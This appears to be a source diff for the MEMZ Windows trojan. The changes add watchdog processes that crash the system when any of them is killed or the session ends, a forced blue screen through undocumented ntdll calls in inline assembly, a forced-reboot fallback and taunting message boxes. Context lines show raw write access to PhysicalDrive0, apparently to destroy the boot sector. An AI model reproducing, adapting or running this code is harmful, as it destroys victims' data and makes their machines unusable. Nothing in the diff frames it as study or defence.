@@ -44,6 +44,23 @@ const char *sites[] = {
 	"mmc",
 };
 
+const char *msgs[] = {
+	"YOU KILLED MY TROJAN!\r\nNow you are going to die.",
+	"REST IN PISS, FOREVER MISS.",
+	"I WARNED YOU...",
+	"HAHA N00B L2P R3KT",
+	"You failed at your 1337 h4x0r skillz.",
+	"YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!",
+	"HACKER!\r\nENJOY BAN!",
+	"GET BETTER HAX NEXT TIME xD",
+	"HAVE FUN TRYING TO RESTORE YOUR DATA :D",
+	"|\/|3|\/|2",
+	"BSOD INCOMING",
+	"VIRUS PRANK (GONE WRONG)",
+	"ENJOY THE NYAN CAT",
+	"GET MLG ANTIVIRUS NEXT TIME",
+};
+
 // Split into 2 parts to save some space.
 
 const unsigned char code1[] = {
@@ -244,8 +261,14 @@ const unsigned char code2[] = {
 int random();
 void strReverseW(LPWSTR str);
 
+DWORD WINAPI ripMessageThread(LPVOID);
 DWORD WINAPI payloadThread(LPVOID);
-DWORD WINAPI watchdogThread(LPVOID parameter);
+DWORD WINAPI watchdogThread(LPVOID);
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+
+void killWindows();
+void killWindowsInstant();
 
 int payloadExecute(int, int);
 int payloadCursor(int, int);
@@ -272,19 +295,42 @@ void main() {
 	int argc;
 	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
+	if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
+		ExitProcess(1);
+
 	if (argc > 1) {
 		if (!lstrcmpW(argv[1], L"/watchdog")) {
 			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);
 
-			for (;;) {
-				Sleep(10000);
+			WNDCLASSEX c;
+			c.cbSize = sizeof(WNDCLASSEX);
+			c.lpfnWndProc = WindowProc;
+			c.lpszClassName = "hax";
+			c.style = 0;
+			c.cbClsExtra = 0;
+			c.cbWndExtra = 0;
+			c.hInstance = NULL;
+			c.hIcon = 0;
+			c.hCursor = 0;
+			c.hbrBackground = 0;
+			c.lpszMenuName = NULL;
+			c.hIconSm = 0;
+
+			RegisterClassEx(&c);
+
+			HWND hwnd = CreateWindowEx(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
+
+			MSG msg;
+			while (GetMessage(&msg, NULL, 0, 0) > 0) {
+				TranslateMessage(&msg);
+				DispatchMessage(&msg);
 			}
 		}
 	} else {
 		char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 8192);
 		GetModuleFileNameA(NULL, fn, 8192);
 
-		for (int i = 0; i < 3; i++)
+		for (int i = 0; i < 5; i++)
 			ShellExecuteA(NULL, NULL, fn, "/watchdog", NULL, SW_SHOWDEFAULT);
 
 		SHELLEXECUTEINFO info;
@@ -304,9 +350,6 @@ void main() {
 
 		ExitProcess(0);
 	}
-
-	if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
-		ExitProcess(1);
 
 	HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 
@@ -369,9 +412,19 @@ void main() {
 	for (;;) {
 		Sleep(10000);
 	}
-
-	ExitProcess(-1); // How would that ever happen?
 }
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
+		killWindows();
+		return 0;
+	}
+
+	return DefWindowProc(hwnd, msg, wParam, lParam);
+}
+
+BOOLEAN tmp1;
+DWORD tmp2;
 
 DWORD WINAPI watchdogThread(LPVOID parameter) {
 	int oproc = 0;
@@ -405,27 +458,78 @@ DWORD WINAPI watchdogThread(LPVOID parameter) {
 		CloseHandle(snapshot);
 
 		if (nproc < oproc) {
-			// Privilege crap
-
-			HANDLE token;
-			TOKEN_PRIVILEGES privileges;
-
-			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
-
-			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
-			privileges.PrivilegeCount = 1;
-			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
-
-			// The actual restart
-			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
+			killWindows();
 		}
 
 		oproc = nproc;
 
 		Sleep(10);
 	}
+}
+
+void killWindows() {
+	// Show cool MessageBoxes
+	for (int i = 0; i < 20; i++) {
+		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
+		Sleep(100);
+	}
+
+	killWindowsInstant();
+}
+
+void killWindowsInstant() {
+	// Try to force BSOD first
+	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
+	// This isn't even an exploit, it's just an undocumented feature.
+	HMODULE ntdll = LoadLibrary("ntdll");
+	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
+	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
+
+	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
+		__asm {
+			push offset tmp1
+
+			push byte ptr 0
+			push byte ptr 1
+			push dword ptr 19
+
+			call RtlAdjustPrivilege
+
+			push offset tmp2
+
+			push dword ptr 6
+			push dword ptr 0
+			push dword ptr 0
+			push dword ptr 0
+
+			push dword ptr 0xc0000022
+
+			call NtRaiseHardError
+		};
+	}
+
+	// If the computer is still running, do it the normal way
+	HANDLE token;
+	TOKEN_PRIVILEGES privileges;
+
+	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
+
+	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
+	privileges.PrivilegeCount = 1;
+	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
+
+	// The actual restart
+	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
+}
+
+DWORD WINAPI ripMessageThread(LPVOID parameter) {
+	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
+	MessageBox(NULL, (LPCSTR)msgs[random() % (sizeof(msgs) / sizeof(void*))], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
+	UnhookWindowsHookEx(hook);
+
+	return 0;
 }
 
 DWORD WINAPI payloadThread(LPVOID parameter) {
